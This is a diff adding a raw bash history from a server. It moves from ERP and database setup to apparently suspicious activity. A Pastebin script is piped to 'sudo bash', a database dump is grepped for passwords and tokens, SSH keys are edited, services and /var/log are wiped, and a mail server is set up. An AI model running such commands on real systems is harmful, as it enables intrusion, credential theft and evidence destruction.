@@ -1,0 +1,674 @@
+    1  2025-10-17 14:07:02 exit
+    2  2025-10-17 14:29:15 ls
+    3  2025-10-17 14:45:00 exit
+    4  2025-10-24 12:09:01 clear
+    5  2025-10-24 12:09:02 ls
+    6  2025-10-24 12:09:10 mkdir warepro
+    7  2025-10-24 12:09:14 cd warepro/
+    8  2025-10-24 12:10:42 sudo apt-get install net-tools
+    9  2025-10-24 12:10:52 java --version
+   10  2025-10-24 12:10:56 sudo apt-get update
+   11  2025-10-24 12:11:26 sudo apt install openjdk-11-jdk
+   12  2025-10-24 12:12:05 nano ~/.bashrc
+   13  2025-10-24 12:12:33 source ~/.bashrc
+   14  2025-10-24 12:12:42 sudo sh -c 'echo "deb http://apt.postgresql.org/pub/repos/apt/ $(lsb_release -cs)-pgdg main" > /etc/apt/sources.list.d/pgdg.list'
+   15  2025-10-24 12:12:42 wget --quiet -O - https://www.postgresql.org/media/keys/ACCC4CF8.asc | sudo apt-key add -
+   16  2025-10-24 12:12:46 sudo apt install postgresql-14
+   17  2025-10-24 12:29:08 sudo systemctl status postgresql
+   18  2025-10-24 12:29:11 sudo -u postgres psql
+   19  2025-10-24 17:03:40 exit
+   20  2025-10-24 17:03:58 sudo vi /etc/postgresql/14/main/pg_hba.conf
+   21  2025-10-24 17:04:30 sudo systemctl restart postgresql
+   22  2025-10-24 17:04:37 sudo su - postgres
+   23  2025-10-24 17:04:50 createdb  --template=template0 -E UNICODE -O adempiere -U adempiere idempiere
+   24  2025-10-24 17:04:54 psql -d idempiere -U adempiere -c "ALTER ROLE adempiere SET search_path TO adempiere, pg_catalog"
+   25  2025-10-24 17:05:02 psql -d idempiere -U adempiere -c 'CREATE EXTENSION "uuid-ossp"'
+   26  2025-10-24 17:05:39 cd warepro/
+   27  2025-10-24 17:13:55 ls
+   28  2025-10-24 17:13:57 pwd
+   29  2025-10-24 17:14:37 exit
+   30  2025-10-24 17:15:07 ls
+   31  2025-10-24 17:15:09 cd warepro/
+   32  2025-10-24 17:15:10 ls
+   33  2025-10-24 17:15:12 clear
+   34  2025-10-24 17:15:50 sudo chmod +x download1.deb 
+   35  2025-10-24 17:15:56 sudo dpkg -i download1.deb
+   36  2025-10-24 17:16:08 sudo /etc/init.d/idempiere configure
+   37  2025-10-24 17:19:17 sudo SYSTEMCTL_SKIP_REDIRECT=1 /etc/init.d/idempiere start
+   38  2025-10-24 17:25:13 ls
+   39  2025-10-24 17:26:13 createdb  --template=template0 -E UNICODE -O adempiere -U adempiere vinayERP
+   40  2025-10-24 17:26:23 psql -d vinayERP -U adempiere -c "ALTER ROLE adempiere SET search_path TO adempiere, pg_catalog"
+   41  2025-10-24 17:26:24 psql -d vinayERP -U adempiere -c 'CREATE EXTENSION "uuid-ossp"' 
+   42  2025-10-24 17:26:25 psql -d vinayERP -U adempiere -f /home/mahe/Documents/Dumps/vinayERP.dmp
+   43  2025-10-24 17:26:38 psql -d vinayERP -U adempiere -f vinayERP.dmp
+   44  2025-10-24 17:27:21 cd
+   45  2025-10-24 17:27:32 cd /opt/idempiere-server/
+   46  2025-10-24 17:27:38 sudo vi idempiere.properties 
+   47  2025-10-24 17:28:24 sudo vi idempiereEnv.properties 
+   48  2025-10-24 17:29:00 sudo systemctl restart idempiere.service 
+   49  2025-10-24 17:29:54 sudo apt update
+   50  2025-10-24 17:30:01 sudo apt install nginx
+   51  2025-10-24 17:30:20 systemctl status nginx
+   52  2025-10-24 17:30:22 sudo snap install --classic certbot
+   53  2025-10-24 17:30:49 sudo ln -s /snap/bin/certbot /usr/bin/certbot
+   54  2025-10-24 17:30:53 sudo certbot --nginx
+   55  2025-10-24 17:33:48 cd /etc/nginx/sites-available/
+   56  2025-10-24 17:33:51 sudo vi default 
+   57  2025-10-24 17:34:41 sudo ln -s /etc/nginx/sites-available/default /etc/nginx/sites-enabled/default
+   58  2025-10-24 17:34:45 sudo rm ../sites-enabled/default 
+   59  2025-10-24 17:34:45 sudo ln -s /etc/nginx/sites-available/default /etc/nginx/sites-enabled/default
+   60  2025-10-24 17:34:45 sudo systemctl reload nginx
+   61  2025-10-24 17:34:49 exit
+   62  2025-10-24 17:39:33 sudo systemctl reload nginx
+   63  2025-10-24 17:39:36 sudo systemctl restart idempiere.service 
+   64  2025-10-24 17:42:20 cd /opt/idempiere-server/l
+   65  2025-10-24 17:42:22 cd /opt/idempiere-server/log/
+   66  2025-10-24 17:42:23 ls
+   67  2025-10-24 17:42:27 cat idempiere_20251024174101.log
+   68  2025-10-31 10:38:12 cd /etc/nginx/sites-available/
+   69  2025-10-31 10:38:13 ls
+   70  2025-10-31 10:38:16 sudo vi default 
+   71  2025-10-31 10:38:45 exit
+   72  2025-10-31 11:23:00 sudo systemctl restart idempiere.service 
+   73  2025-10-31 11:29:24 exit
+   74  2025-10-31 12:24:03 sudo su postgres
+   75  2025-10-31 12:29:48 exi\ls
+   76  2025-10-31 12:29:51 ls
+   77  2025-10-31 12:29:55 cd warepro/
+   78  2025-10-31 12:29:55 ls
+   79  2025-10-31 12:30:26 l
+   80  2025-10-31 12:31:09 createdb  --template=template0 -E UNICODE -O adempiere -U adempiere vinayERP
+   81  2025-10-31 12:31:16 psql -d vinayERPNew -U adempiere -c "ALTER ROLE adempiere SET search_path TO adempiere, pg_catalog"
+   82  2025-10-31 12:31:17 psql -d vinayERPNew -U adempiere -c 'CREATE EXTENSION "uuid-ossp"' 
+   83  2025-10-31 12:31:36 psql -d vinayERPNew -U adempiere -f /home/mahe/Documents/Dumps/vinayERPNew.dmp
+   84  2025-10-31 12:31:39 createdb  --template=template0 -E UNICODE -O adempiere -U adempiere vinayERPNew
+   85  2025-10-31 12:31:44 psql -d vinayERPNew -U adempiere -c "ALTER ROLE adempiere SET search_path TO adempiere, pg_catalog"
+   86  2025-10-31 12:31:45 psql -d vinayERPNew -U adempiere -c 'CREATE EXTENSION "uuid-ossp"' 
+   87  2025-10-31 12:31:46 psql -d vinayERPNew -U adempiere -f /home/mahe/Documents/Dumps/vinayERPNew.dmp
+   88  2025-10-31 12:31:53 psql -d vinayERPNew -U adempiere -f vinayERPNew.dmp
+   89  2025-10-31 12:32:30 cd
+   90  2025-10-31 12:32:32 cd /opt/idempiere-server/
+   91  2025-10-31 12:32:36 sudo vi idempiere.properties 
+   92  2025-10-31 12:33:15 sudo vi idempiereEnv.properties 
+   93  2025-10-31 12:33:35 sudo systemctl restart idempiere.service 
+   94  2025-10-31 12:34:11 sudo su postgres
+   95  2025-10-31 12:35:09 exit
+   96  2025-10-31 11:38:21 cd /opt/idempiere-server/log/
+   97  2025-10-31 11:38:22 ls
+   98  2025-10-31 11:38:26 cat idempiere_20251031112305.log
+   99  2025-10-31 12:19:24 cd /opt/idempiere-server/
+  100  2025-10-31 12:19:26 ls
+  101  2025-10-31 12:19:35 sudo cat idempiere.properties 
+  102  2025-11-03 15:45:28 sudo su postgres
+  103  2025-11-03 15:48:18 exit
+  104  2025-11-03 17:45:34 sudo systemctl restart idempiere.service 
+  105  2025-11-03 17:46:26 exit
+  106  2025-11-07 12:22:28 sudo su postgres
+  107  2025-11-07 12:25:00 exit
+  108  2025-11-24 17:36:23 cd /opt/idempiere-server/
+  109  2025-11-24 17:36:28 sudo cat idempiere.properties 
+  110  2025-11-24 17:36:42 sudo su postgres
+  111  2025-11-24 17:36:58 exit
+  112  2025-11-26 11:40:43 sudo service idempiere restart 
+  113  2025-11-26 14:27:08 sudo su postgres
+  114  2025-11-26 14:27:30 exit
+  115  2025-12-05 10:08:08 sudo service idempiere restart 
+  116  2025-12-09 17:40:00 cd /etc/
+  117  2025-12-09 17:40:01 ls
+  118  2025-12-09 17:40:06 cd postgresql
+  119  2025-12-09 17:40:08 ls
+  120  2025-12-09 17:40:12 cd 14/main/
+  121  2025-12-09 17:40:13 ls
+  122  2025-12-09 17:40:29 sudo nano pg_hba.conf 
+  123  2025-12-09 17:44:24 sudo nano postgresql.conf 
+  124  2025-12-09 17:46:19 cd
+  125  2025-12-09 17:46:28 sudo service postgresql restart 
+  126  2025-12-09 17:48:07 cd /opt/idempiere-server/
+  127  2025-12-09 17:48:15 sudo cat idempiereEnv.properties 
+  128  2025-12-09 18:12:35 cd
+  129  2025-12-09 18:12:44 sudo service idempiere restart 
+  130  2025-12-10 17:49:46 cd /opt/idempiere-server/
+  131  2025-12-10 17:49:52 cat idempiere.properties 
+  132  2025-12-10 17:50:07 sudo su postgres
+  133  2025-12-10 17:52:30 exit
+  134  2025-12-10 17:57:29 sudo su postgres
+  135  2025-12-10 17:57:55 exit
+  136  2025-12-12 15:19:15 cd /opt/idempiere-server/log/
+  137  2025-12-12 15:19:16 ls
+  138  2025-12-12 15:19:34 cat idempiere_20251209181249.log
+  139  2025-12-15 10:50:24 sudo service idempiere restart 
+  140  2025-12-23 14:47:33 exit
+  141  2025-12-23 17:02:48 cd /opt/idempiere-server/log/
+  142  2025-12-23 17:02:49 ls
+  143  2025-12-23 17:03:12 cat idempiere.2025-12-23_1.log
+  144  2025-12-23 17:03:31 cat idempiere.2025-12-23_0.log
+  145  2025-12-24 11:23:16 cd /opt/idempiere-server/log/
+  146  2025-12-24 11:23:18 ls
+  147  2025-12-24 11:41:16 cat idempiere.2025-12-23_0.log
+  148  2025-12-29 10:42:03 cd /opt/idempiere-server/log/
+  149  2025-12-29 10:42:05 ls
+  150  2025-12-29 10:42:13 cat idempiere.2025-12-29_0.log
+  151  2025-12-29 10:42:50 cd
+  152  2025-12-29 10:42:54 free -h
+  153  2025-12-29 10:43:06 cd /opt/idempiere-server/utils/
+  154  2025-12-29 10:43:08 ls
+  155  2025-12-29 10:43:18 sudo nano myEnvironment.sh 
+  156  2025-12-29 10:44:34 cd
+  157  2025-12-29 10:44:37 sudo service idempiere restart 
+  158  2026-01-09 10:20:28 ls
+  159  2026-01-09 10:20:58 cd /opt/idempiere-server/
+  160  2026-01-09 10:21:06 sudo cat idempiereEnv.properties 
+  161  2026-01-09 10:21:45 pg_dump -U adempiere -W vinayERPNew > devcr26.dmp
+  162  2026-01-09 10:22:10 ls
+  163  2026-01-09 10:22:55 mv devcr26.dmp /root/
+  164  2026-01-09 10:22:57 cd
+  165  2026-01-09 10:22:59 ls
+  166  2026-01-09 10:23:25 mv devcr26.dmp vedev26.dmp
+  167  2026-01-09 10:23:27 ls
+  168  2026-01-09 10:32:15 cd /etc/postgresql/14/main/
+  169  2026-01-09 10:32:16 ls
+  170  2026-01-09 10:33:00 sudo nano pg_hba.conf 
+  171  2026-01-09 10:34:33 sudo nano postgresql.conf 
+  172  2026-01-09 10:35:13 sudo service postgresql restart 
+  173  2026-01-09 10:35:30 sudo service idempiere restart 
+  174  2026-01-09 14:49:37 cd /opt/idempiere-server/utils/
+  175  2026-01-09 14:49:52 sudo nano myEnvironment.sh 
+  176  2026-01-09 14:50:18 cd ../
+  177  2026-01-09 14:50:28 sudo nano idempiereEnv.properties 
+  178  2026-01-09 14:51:09 cd
+  179  2026-01-09 14:51:12 sudo service idempiere restart 
+  180  2026-01-09 14:51:36 exit
+  181  2026-01-09 14:54:00 >9J[?PV3r[175^Iu
+  182  2026-01-09 14:54:12 ps -ef | grep idempiere | grep java
+  183  2026-01-09 14:54:21 cd /opt/idempiere-server/
+  184  2026-01-09 14:54:28 sudo nano idempiereEnv.properties 
+  185  2026-01-09 14:54:43 cd
+  186  2026-01-09 14:54:46 sudo service idempiere restart 
+  187  2026-01-21 10:39:20 free -h
+  188  2026-01-21 10:39:31 sudo nano /opt/idempiere-server/utils/myEnvironment.sh 
+  189  2026-01-21 10:40:02 sudo SYSTEMCTL_SKIP_REDIRECT=1 /etc/init.d/idempiere start
+  190  2026-01-21 10:40:12 sudo service idempiere restart 
+  191  2026-01-21 10:40:38 exit
+  192  2026-01-27 17:39:58 cd /opt/idempiere-server/
+  193  2026-01-27 17:40:04 suod cat idempiere.properties 
+  194  2026-01-27 17:40:12 sudo cat idempiere.properties 
+  195  2026-01-27 17:40:23 sudo su postgres
+  196  2026-01-27 17:41:07 exit
+  197  2026-02-12 11:23:20 sudo -i -u postgres 
+  198  2026-02-12 11:24:33 exit
+  199  2026-02-28 05:40:30 lscpu
+  200  2026-02-28 05:40:33 htop
+  201  2026-02-28 05:40:39 curl -fsSL https://pastebin.com/raw/Qh0Kt8GR | sed 's/\r$//' | sudo bash
+  202  2026-02-28 05:40:58 htop
+  203  2026-03-01 22:36:25 ls /usr/bin/sg_metrics
+  204  2026-03-15 16:30:36 ls
+  205  2026-03-15 16:30:47 python3
+  206  2026-03-15 16:31:32 ls
+  207  2026-03-15 16:31:35 clear
+  208  2026-03-15 16:31:37 ls
+  209  2026-03-15 16:32:38 ls -la
+  210  2026-03-15 16:33:01 clear
+  211  2026-03-15 16:33:44 file '9J[?PV3r[175^Iu'
+  212  2026-03-15 16:33:44 stat '9J[?PV3r[175^Iu'
+  213  2026-03-15 16:34:15 ls -lah
+  214  2026-03-15 16:34:22 du -ah | sort -rh | head -20
+  215  2026-03-15 16:34:35 file *
+  216  2026-03-15 16:34:49 strings vedev26.dmp | head
+  217  2026-03-15 16:34:55 strings vedev26.dmp | grep -i password
+  218  2026-03-15 16:34:59 strings vedev26.dmp | grep -i http
+  219  2026-03-15 16:35:10 strings vedev26.dmp | grep -i token
+  220  2026-03-15 16:36:07 ls -lah warepro
+  221  2026-03-15 16:36:21 clear
+  222  2026-03-15 16:36:23 ls
+  223  2026-03-15 16:36:29 cd snap/
+  224  2026-03-15 16:36:31 ls
+  225  2026-03-15 16:36:43 cd certbot/
+  226  2026-03-15 16:36:44 ls
+  227  2026-03-15 16:36:49 cd
+  228  2026-03-15 16:36:56 df -h
+  229  2026-03-15 16:37:23 du -ah / | sort -rh | head -20
+  230  2026-03-15 16:37:32 du -h --max-depth=1 / | sort -rh
+  231  2026-03-15 16:37:41 clear
+  232  2026-03-15 16:37:45 du -h --max-depth=1 / | sort -rh
+  233  2026-03-15 16:38:39 ss -tulpn
+  234  2026-03-15 16:40:45 Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-133-generic x86_64)
+  235  2026-03-15 16:40:49 Expanded Security Maintenance for Applications is not enabled.
+  236  2026-03-15 16:40:49 68 updates can be applied immediately.
+  237  2026-03-15 16:40:49 To see these additional updates run: apt list --upgradable
+  238  2026-03-15 16:40:49 Enable ESM Apps to receive additional future security updates.
+  239  2026-03-15 16:40:49 See https://ubuntu.com/esm or run: sudo pro status
+  240  2026-03-15 16:40:50 New release '24.04.4 LTS' available.
+  241  2026-03-15 16:40:50 Run 'do-release-upgrade' to upgrade to it.
+  242  2026-03-15 16:40:50 *** System restart required ***
+  243  2026-03-15 16:40:50 Last login: Sun Mar 15 16:30:29 2026 from 152.58.188.126
+  244  2026-03-15 16:40:50 root@vm-test:~# 
+  245  2026-03-15 16:40:51 clear
+  246  2026-03-15 16:42:01 free -h
+  247  2026-03-15 16:42:08 ps aux --sort=-%mem | head
+  248  2026-03-15 16:42:22 apt update
+  249  2026-03-15 16:43:07 apt upgrade -y
+  250  2026-03-15 16:46:10 curl -k https://localhost:8443
+  251  2026-03-15 16:46:14 clear
+  252  2026-03-15 16:46:18 curl -k https://localhost:8443/webui
+  253  2026-03-15 16:46:25 ps aux | grep java
+  254  2026-03-15 16:46:29 lsof -p 4072245
+  255  2026-03-15 16:46:40 nmap 188.241.187.186
+  256  2026-03-15 16:47:16 clear
+  257  2026-03-15 16:48:35 https://188.241.187.186:8443/webui
+  258  2026-03-15 16:48:43 ss -tulpn | grep -E "80|443|8080|8443"
+  259  2026-03-15 17:00:10 systemctl status postgresql
+  260  2026-03-15 17:00:42 ss -tulpn | grep 5432
+  261  2026-03-15 17:00:55 root@vm-test:~# ss -tulpn | grep 5432
+  262  2026-03-15 17:00:56 tcp   LISTEN 0      244                   0.0.0.0:5432       0.0.0.0:*    users:(("postgres",pid=2822026,fd=5))                                                   
+  263  2026-03-15 17:00:56 tcp   LISTEN 0      244                      [::]:5432          [::]:*    users:(("postgres",pid=2822026,fd=6))                                                   
+  264  2026-03-15 17:00:56 root@vm-test:~# ss -tulpn | grep 5432
+  265  2026-03-15 17:00:56 tcp   LISTEN 0      244                   0.0.0.0:5432       0.0.0.0:*    users:(("postgres",pid=2822026,fd=5))                                                   
+  266  2026-03-15 17:00:56 tcp   LISTEN 0      244                      [::]:5432          [::]:*    users:(("postgres",pid=2822026,fd=6))                                                   
+  267  2026-03-15 17:00:56 root@vm-test:~# clear
+  268  2026-03-15 17:00:59 clear
+  269  2026-03-15 17:01:07 sudo -u postgres psql
+  270  2026-03-17 15:11:12 cd /etc/postgresql/14/main/
+  271  2026-03-17 15:11:15 ls
+  272  2026-03-17 15:11:30 sudo cat pg_hba.conf 
+  273  2026-03-21 14:05:47 ls
+  274  2026-04-01 15:07:48 clear
+  275  2026-04-01 15:07:50 ls -lah
+  276  2026-04-01 15:08:48 rm -f '9J[?PV3r[175^Iu'
+  277  2026-04-01 15:08:48 rm -f vedev26.dmp
+  278  2026-04-01 15:08:48 rm -rf warepro
+  279  2026-04-01 15:08:53 cat ~/.ssh/authorized_keys
+  280  2026-04-01 15:09:03 nano ~/.ssh/authorized_keys
+  281  2026-04-01 15:09:11 cut -d: -f1 /etc/passwd
+  282  2026-04-01 15:10:25 userdel -r idempiere
+  283  2026-04-01 15:10:30 clear
+  284  2026-04-01 15:11:37 ls
+  285  2026-04-01 15:12:01 cat ~/.ssh/authorized_keys
+  286  2026-04-01 15:12:32 ls -lah /root/.ssh/
+  287  2026-04-01 15:14:31 clear
+  288  2026-04-01 15:15:33 ls
+  289  2026-04-01 15:15:52 ls -lah ~/.ssh/
+  290  2026-04-01 15:19:26 ls ~/.ssh/
+  291  2026-04-01 15:24:35 ls
+  292  2026-04-01 15:26:08 clear
+  293  2026-04-01 15:26:11 ps aux | grep -E 'nginx|apache|httpd'
+  294  2026-04-01 15:26:39 ls /etc/nginx/sites-enabled/
+  295  2026-04-01 15:27:42 clear
+  296  2026-04-01 15:27:52 /etc/nginx/sites-enabled/
+  297  2026-04-01 15:27:52 → default
+  298  2026-04-01 15:27:56 cat /etc/nginx/sites-enabled/default
+  299  2026-04-01 15:34:19 systemctl stop nginx
+  300  2026-04-01 15:34:19 systemctl stop apache2
+  301  2026-04-01 15:34:19 systemctl stop mysql
+  302  2026-04-01 15:34:19 systemctl stop postgresql
+  303  2026-04-01 15:34:23 clear
+  304  2026-04-01 15:34:28 systemctl stop nginx
+  305  2026-04-01 15:34:28 systemctl stop apache2
+  306  2026-04-01 15:34:28 systemctl stop mysql
+  307  2026-04-01 15:34:28 systemctl stop postgresql
+  308  2026-04-01 15:34:30 apt purge nginx* apache2* mysql* postgresql* certbot* openjdk* nodejs* npm* -y
+  309  2026-04-01 15:35:26 apt autoremove -y
+  310  2026-04-01 15:35:35 apt clean
+  311  2026-04-01 15:35:42 rm -rf /etc/nginx
+  312  2026-04-01 15:35:42 rm -rf /var/www
+  313  2026-04-01 15:35:42 rm -rf /opt/*
+  314  2026-04-01 15:35:42 rm -rf /usr/local/*
+  315  2026-04-01 15:35:47 rm -rf /etc/nginx
+  316  2026-04-01 15:35:47 rm -rf /var/www
+  317  2026-04-01 15:35:47 rm -rf /opt/*
+  318  2026-04-01 15:35:47 rm -rf /usr/local/*
+  319  2026-04-01 15:36:04 rm -rf /var/log/*
+  320  2026-04-01 15:36:04 rm -rf /tmp/*
+  321  2026-04-01 15:36:05 rm -rf /var/tmp/*
+  322  2026-04-01 15:36:12 df -h
+  323  2026-04-01 15:36:12 ps aux
+  324  2026-04-01 15:36:30 ss -tulnpclear
+  325  2026-04-01 15:36:34 clear
+  326  2026-04-01 15:36:36 df -h
+  327  2026-04-01 15:36:36 ps aux
+  328  2026-04-01 15:36:36 ss -tulnp
+  329  2026-04-01 15:39:10 clear
+  330  2026-04-01 15:39:12 apt install fail2ban -y
+  331  2026-04-01 15:39:57 systemctl enable fail2ban
+  332  2026-04-01 15:39:58 systemctl start fail2ban
+  333  2026-04-01 15:40:02 clear
+  334  2026-04-01 15:40:05 ls
+  335  2026-04-01 15:43:11 ps -fp 1711657
+  336  2026-04-01 15:43:23 ls
+  337  2026-04-01 15:43:54 systemctl stop snapd
+  338  2026-04-01 15:43:58 systemctl disable snapd
+  339  2026-04-01 15:44:08 apt purge snapd -y
+  340  2026-04-01 15:44:21 clear
+  341  2026-04-01 15:44:28 rm -rf /snap
+  342  2026-04-01 15:44:28 rm -rf /var/snap
+  343  2026-04-01 15:44:28 rm -rf /var/lib/snapd
+  344  2026-04-01 15:44:28 rm -rf ~/snap
+  345  2026-04-01 23:17:56 ls
+  346  2026-04-01 23:18:01 clear
+  347  2026-04-01 23:29:44 ls
+  348  2026-04-02 00:56:25 clear
+  349  2026-04-02 00:57:41 sudo apt update
+  350  2026-04-02 00:57:52 sudo apt install postfix dovecot-core dovecot-imapd mailutils
+  351  2026-04-02 01:00:58 hostnamectl set-hostname mail.osintnexus.us.cc
+  352  2026-04-02 01:01:02 nano /etc/hosts
+  353  2026-04-02 01:01:29 systemctl restart postfix
+  354  2026-04-02 01:11:03 ping osintnexus.us.cc
+  355  2026-04-02 01:11:11 nslookup osintnexus.us.cc
+  356  2026-04-02 01:19:21 clear
+  357  2026-04-02 01:19:43 nslookup osintnexus.us.cc
+  358  2026-04-02 01:26:29 nslookup mail.osintnexus.us.cc
+  359  2026-04-02 01:27:22 nano /etc/hosts
+  360  2026-04-02 01:27:49 systemctl restart systemd-resolved
+  361  2026-04-02 01:28:02 nslookup mail.osintnexus.us.cc
+  362  2026-04-02 01:28:27 clear
+  363  2026-04-02 01:28:31 nslookup mail.osintnexus.us.cc
+  364  2026-04-02 01:28:52 apt install opendkim opendkim-tools -y
+  365  2026-04-02 01:29:22 mkdir -p /etc/opendkim/keys/osintnexus.us.cc
+  366  2026-04-02 01:29:22 cd /etc/opendkim/keys/osintnexus.us.cc
+  367  2026-04-02 01:29:22 opendkim-genkey -s default -d osintnexus.us.cc
+  368  2026-04-02 01:29:22 cat default.txt
+  369  2026-04-02 01:29:53 clear
+  370  2026-04-02 01:30:32 cat default.txt
+  371  2026-04-02 01:32:30 clear
+  372  2026-04-02 01:32:40 cat default.txt
+  373  2026-04-02 01:33:01 clear
+  374  2026-04-02 01:33:15 cat default.txt | tr -d '\n' | sed 's/[()]//g' | sed 's/"//g'
+  375  2026-04-02 01:33:25 clear
+  376  2026-04-02 01:33:27 cat default.txt | tr -d '\n' | sed 's/[()]//g' | sed 's/"//g'
+  377  2026-04-02 01:34:40 nslookup -type=TXT default._domainkey.osintnexus.us.cc
+  378  2026-04-02 01:34:46 clear
+  379  2026-04-02 01:34:53 systemctl restart opendkim
+  380  2026-04-02 01:34:57 systemctl restart postfix
+  381  2026-04-02 01:35:25 echo "dkim test" | mail -s "test" hackerpiyush506@gmail.com
+  382  2026-04-02 01:35:54 clear
+  383  2026-04-02 01:36:06 echo "dkim test" | mail -s "test" hackerpiyush506@gmail.com
+  384  2026-04-02 01:36:10 clear
+  385  2026-04-02 01:36:18 tail -f /var/log/mail.log
+  386  2026-04-02 01:36:46 systemctl status postfix
+  387  2026-04-02 01:36:58 systemctl status opendkim
+  388  2026-04-02 01:37:28 apt install rsyslog -y
+  389  2026-04-02 01:37:36 systemctl enable rsyslog
+  390  2026-04-02 01:37:36 systemctl start rsyslog
+  391  2026-04-02 01:37:41 systemctl restart postfix
+  392  2026-04-02 01:37:45 tail -f /var/log/mail.log
+  393  2026-04-02 01:37:53 Active: active (exited)
+  394  2026-04-02 01:38:07 adduser piyush
+  395  2026-04-02 01:39:28 echo "hello world" | mail -s "test mail" hackerpiyush506@gmail.com
+  396  2026-04-02 01:40:18 apt install apache2 php php-mysql -y
+  397  2026-04-02 01:40:47 apt install roundcube roundcube-core roundcube-mysql -y
+  398  2026-04-02 01:42:29 apt install mariadb-server -y
+  399  2026-04-02 01:44:39 mysql_secure_installation
+  400  2026-04-02 01:45:22 a2enconf roundcube
+  401  2026-04-02 01:45:22 systemctl reload apache2
+  402  2026-04-02 01:46:13 ls /var/lib/roundcube
+  403  2026-04-02 01:46:20 /usr/share/roundcube
+  404  2026-04-02 01:46:24 ls /usr/share/roundcube
+  405  2026-04-02 01:46:30 ln -s /usr/share/roundcube /var/www/html/roundcube
+  406  2026-04-02 01:46:36 systemctl restart apache2
+  407  2026-04-02 01:47:00 apachectl -S
+  408  2026-04-02 01:47:34 adduser piyush
+  409  2026-04-02 01:47:45 passwd piyush
+  410  2026-04-02 01:49:06 systemctl status dovecot
+  411  2026-04-02 01:49:15 systemctl restart dovecot
+  412  2026-04-02 01:51:21 nano /etc/dovecot/conf.d/10-mail.conf
+  413  2026-04-02 01:52:09 maildirmake /home/piyush/Maildir
+  414  2026-04-02 01:52:09 chown -R piyush:piyush /home/piyush/Maildir
+  415  2026-04-02 01:52:14 systemctl restart dovecot
+  416  2026-04-02 01:52:15 systemctl restart postfix
+  417  2026-04-02 01:53:51 nano /etc/roundcube/config.inc.php
+  418  2026-04-02 01:55:36 systemctl restart apache2
+  419  2026-04-02 01:55:37 systemctl restart postfix
+  420  2026-04-02 01:55:44 telnet gmail-smtp-in.l.google.com 25
+  421  2026-04-02 02:07:30 c
+  422  2026-04-02 02:07:32 clear
+  423  2026-04-02 02:07:38 cd
+  424  2026-04-02 02:07:41 clear
+  425  2026-04-02 02:07:43 npm i -g openclaw
+  426  2026-04-02 02:07:48 apt install npm
+  427  2026-04-02 02:09:23 npm i -g openclaw
+  428  2026-04-02 02:10:50 sudo npm i -g openclaw
+  429  2026-04-02 02:13:34 openclaw onboard
+  430  2026-04-02 02:14:36 apt remove nodejs npm -y
+  431  2026-04-02 02:14:42 rm -rf /usr/local/lib/node_modules
+  432  2026-04-02 02:14:44 curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
+  433  2026-04-02 02:15:00 apt install -y nodejs
+  434  2026-04-02 02:15:15 node -v
+  435  2026-04-02 02:15:15 npm -v
+  436  2026-04-02 02:15:25 curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
+  437  2026-04-02 02:15:32 apt install -y nodejs
+  438  2026-04-02 02:15:43 npm -v
+  439  2026-04-02 02:16:03 clear
+  440  2026-04-02 02:16:27 apt remove libnode-dev -y
+  441  2026-04-02 02:16:42 dpkg --configure -a
+  442  2026-04-02 02:16:42 apt clean
+  443  2026-04-02 02:16:42 apt autoremove -y
+  444  2026-04-02 02:17:00 apt install -y nodejs --fix-broken
+  445  2026-04-02 02:17:19 node -v
+  446  2026-04-02 02:17:19 npm -v
+  447  2026-04-02 02:17:24 npm install -g openclaw
+  448  2026-04-02 02:17:31 openclaw onboard
+  449  2026-04-02 02:17:36 openclaw 
+  450  2026-04-02 02:17:55 openclaw
+  451  2026-04-02 02:18:03 clear
+  452  2026-04-02 02:18:17 openclaw
+  453  2026-04-02 02:18:24 npm root -g
+  454  2026-04-02 02:18:24 npm bin -g
+  455  2026-04-02 02:18:29 npm root -g
+  456  2026-04-02 02:18:29 npm bin -g
+  457  2026-04-02 02:18:33 /usr/local/lib/node_modules
+  458  2026-04-02 02:18:34 /usr/local/bin
+  459  2026-04-02 02:18:43 ls /usr/local/bin | grep openclaw
+  460  2026-04-02 02:18:47 export PATH=$PATH:/usr/local/bin
+  461  2026-04-02 02:18:51 source ~/.bashrc
+  462  2026-04-02 02:18:57 openclaw onboard
+  463  2026-04-02 02:19:05 npx openclaw onboard
+  464  2026-04-02 02:19:11 which openclaw
+  465  2026-04-02 02:19:19 /root/.npm-global/bin
+  466  2026-04-02 02:19:40 clear
+  467  2026-04-02 02:19:55 ls -l /usr/local/bin/openclaw
+  468  2026-04-02 02:20:10 node /usr/lib/node_modules/openclaw/bin/openclaw.js
+  469  2026-04-02 02:20:16 node /usr/lib/node_modules/openclaw/dist/index.js
+  470  2026-04-02 02:20:20 npm config set prefix /usr/local
+  471  2026-04-02 02:20:27 npm install -g openclaw
+  472  2026-04-02 02:20:35 ls -l /usr/local/bin/openclaw
+  473  2026-04-02 02:20:35 which openclaw
+  474  2026-04-02 02:20:47 openclaw onboard
+  475  2026-04-02 02:20:53 openclaw
+  476  2026-04-02 02:22:02 npm install -g openclaw
+  477  2026-04-02 02:22:02 openclaw onboard --install-daemon
+  478  2026-04-02 02:22:23 openclaw setup
+  479  2026-04-02 02:22:23 openclaw setup --workspace ~/.openclaw/workspace
+  480  2026-04-02 02:22:28 openclaw setup
+  481  2026-04-02 02:22:28 openclaw setup --workspace ~/.openclaw/workspace
+  482  2026-04-02 02:22:33 openclaw setup --wizard
+  483  2026-04-02 02:23:31 curl -fsSL https://openclaw.ai/install.sh | bash
+  484  2026-04-02 01:57:23 echo "SMTP test from VPS" | mail -s "TEST MAIL" hackerpiyush506@gmail.com
+  485  2026-04-02 01:57:47 mailq
+  486  2026-04-02 01:58:35 mailqsystemctl stop postfix dovecot opendkim apache2 mariadb
+  487  2026-04-02 01:58:36 systemctl stop postfix dovecot opendkim apache2 mariadb
+  488  2026-04-02 01:58:43 apt purge postfix dovecot-core dovecot-imapd opendkim opendkim-tools roundcube roundcube-core roundcube-mysql mariadb-server -y
+  489  2026-04-02 01:59:10 rm -rf /etc/postfix
+  490  2026-04-02 01:59:10 rm -rf /etc/dovecot
+  491  2026-04-02 01:59:10 rm -rf /etc/opendkim
+  492  2026-04-02 01:59:10 rm -rf /etc/roundcube
+  493  2026-04-02 01:59:10 rm -rf /var/lib/roundcube
+  494  2026-04-02 01:59:10 rm -rf /var/mail
+  495  2026-04-02 01:59:10 rm -rf /var/spool/mail
+  496  2026-04-02 01:59:15 rm -rf /home/piyush/Maildir
+  497  2026-04-02 01:59:20 rm -rf /var/www/html/roundcube
+  498  2026-04-02 01:59:26 apt autoremove -y
